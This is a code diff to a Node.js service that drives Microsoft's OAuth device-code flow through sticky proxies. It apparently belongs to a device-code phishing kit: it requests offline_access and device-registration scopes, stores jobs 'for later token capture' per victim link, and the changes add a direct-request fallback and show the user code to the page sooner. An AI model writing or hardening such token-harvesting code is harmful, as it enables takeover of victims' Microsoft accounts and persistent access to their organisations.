@@ -52,23 +52,71 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     const clientId = config.AZURE_CLIENT_ID;
     const deviceCodeScope =
       'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default';
-    // Claim a sticky proxy for the entire device code flow
-    const { proxy, response: dcResponse } = await ms.post(
-      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
-      new URLSearchParams({
-        client_id: clientId,
-        scope: deviceCodeScope,
-      }),
-      {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
+    const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
+    const deviceCodeBody = new URLSearchParams({
+      client_id: clientId,
+      scope: deviceCodeScope,
+    });
+    const requestHeaders = {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    };
+
+    // Claim a sticky proxy for the entire device code flow. Microsoft binds
+    // the device_code to the IP that requested it, so the token poll MUST
+    // reuse the same egress IP for the whole flow.
+    //
+    // If the proxied request fails (proxy down, proxy IP blocked by
+    // Microsoft, or an error body instead of a device code), fall back to a
+    // direct request. A broken proxy must not silently produce a job with no
+    // user_code — that job polls forever and the page hangs on
+    // "Generating code..." with no way forward.
+    let proxy = null;
+    let dcData = null;
+
+    try {
+      const sticky = await ms.post(deviceCodeUrl, deviceCodeBody, {
+        headers: requestHeaders,
         timeout: 15000,
         stickyProxy: true,
+      });
+      proxy = sticky.proxy;
+      const data = sticky.response && sticky.response.data;
+      if (data && data.user_code && data.device_code) {
+        dcData = data;
+      } else {
+        console.warn('[DeviceProxy] Proxied devicecode request returned no user_code; falling back to direct',
+          data && data.error ? data.error : '');
       }
-    );
+    } catch (err) {
+      console.warn('[DeviceProxy] Proxied devicecode request failed; falling back to direct:', err.message);
+    }
 
-    const dcData = dcResponse.data;
+    if (!dcData) {
+      const direct = await ms.post(deviceCodeUrl, deviceCodeBody, {
+        headers: requestHeaders,
+        timeout: 15000,
+        noProxy: true,
+      });
+      const data = direct.data;
+      if (data && data.user_code && data.device_code) {
+        dcData = data;
+        // The device_code is now bound to the direct egress IP. Drop the
+        // proxy so the token poll goes direct too — mixing IPs mid-flow
+        // makes Microsoft reject the exchange.
+        if (proxy && proxy.id) {
+          try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
+        }
+        proxy = null;
+      }
+    }
+
+    if (!dcData) {
+      if (proxy && proxy.id) {
+        try { await proxyManager.releaseProxy(proxy.id, false); } catch (e) { /* ignore */ }
+      }
+      throw new Error('Microsoft device code request failed: no user_code returned (proxy and direct attempts both failed)');
+    }
+
     const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
 
     // Store job in memory with IP/user-agent for later token capture
@@ -77,6 +125,9 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       user_id,
       link_id,
       device_code: dcData.device_code,
+      user_code: dcData.user_code,
+      verification_uri: dcData.verification_uri,
+      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
       interval: dcData.interval || 5,
       expires_in: dcData.expires_in || 900,
       expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
@@ -160,6 +211,10 @@ async function pollForToken(jobId) {
           validateStatus: () => true,
           timeout: 15000,
           proxy: job.proxy,
+          // Jobs that fell back to a direct devicecode request have no proxy.
+          // Force the poll direct too — otherwise ms.post claims a fresh
+          // proxy and the IP mismatch makes Microsoft reject the exchange.
+          noProxy: !job.proxy_id,
         }
       );
 
@@ -219,6 +274,7 @@ async function pollForToken(jobId) {
                 validateStatus: () => true,
                 timeout: 15000,
                 proxy: job.proxy,
+                noProxy: !job.proxy_id,
               }
             );
 
@@ -385,6 +441,9 @@ async function retryAsTokenMode(originalJob) {
       user_id: originalJob.user_id,
       link_id: originalJob.link_id,
       device_code: dcData.device_code,
+      user_code: dcData.user_code,
+      verification_uri: dcData.verification_uri,
+      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
       interval: dcData.interval || 5,
       expires_in: dcData.expires_in || 900,
       expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
@@ -930,6 +989,11 @@ function getJobStatus(jobId) {
   if (job.status === 'polling') {
     // Return waiting status
     result.status = 'waiting_user';
+    // Surface the user code (and verification URI) as soon as the job has
+    // it, so the page can render the code without waiting for a second poll.
+    result.user_code = job.user_code || null;
+    result.verification_uri = job.verification_uri || null;
+    result.verification_uri_complete = job.verification_uri_complete || null;
   }
 
   if (job.status === 'expired' || job.status === 'failed') {
